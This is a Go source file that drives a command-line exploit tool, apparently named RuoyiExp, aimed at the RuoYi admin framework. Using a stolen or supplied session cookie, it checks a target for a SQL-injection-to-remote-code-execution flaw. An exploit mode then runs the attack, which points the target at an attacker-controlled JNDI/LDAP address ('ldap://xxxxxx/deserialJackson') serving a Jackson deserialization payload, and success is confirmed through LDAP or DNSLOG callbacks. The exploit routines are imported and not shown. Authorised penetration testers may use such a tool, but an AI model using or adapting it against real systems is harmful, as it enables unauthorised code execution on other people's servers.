package run

import (
	"RuoyiExp/exploit"
	"RuoyiExp/utils"
	"flag"
	"log"
	"strings"
)

var (
	URL        string
	JNDI       string
	CookieFile string
	Fuck       bool
	Timeout    int
)

func Run() {
	ArgParse()
	cookies := utils.LoadCookie(CookieFile)
	if !utils.CheckCookie(URL, cookies, Timeout) {
		log.SetPrefix("[-] ")
		log.Fatalln("Cookie Is Invalid!")
	}
	if exploit.Sql2RceCheck(URL, cookies, Timeout) {
		log.SetPrefix("[*] ")
		log.Println("Target: " + URL + " is Vuln")
		if Fuck {
			exploit.Sql2RceExploit(URL, cookies, JNDI, Timeout)
		}
		log.SetPrefix("[+] ")
		log.Println("Finished,Check Result By Your LDAP Server Log Or DNSLOG Platform.")
	} else {
		log.SetPrefix("[+] ")
		log.Println("target: " + URL + " is Safe")
	}
}
func ArgParse() {
	flag.StringVar(&URL, "u", "", "Target URL")
	flag.IntVar(&Timeout, "t", 10, "Request Timeout,Default is 10s")
	flag.StringVar(&CookieFile, "c", "cookie.txt", "Cookie File,Default Is cookie.txt")
	flag.StringVar(&JNDI, "j", "", "JNDI PATH Like ldap://xxxxxx/deserialJackson")
	flag.BoolVar(&Fuck, "e", false, "Fuck Mode")
	flag.Parse()
	if URL == "" || !strings.Contains(URL, "http") {
		log.SetPrefix("[-] ")
		log.Fatalln("Invalid URL")
	}
	if Fuck && JNDI == "" {
		log.SetPrefix("[-] ")
		log.Fatalln("Fuck Mode Must Specific A JNDI Address Like ldap://xxxxxx/deserialJackson")
	}
}
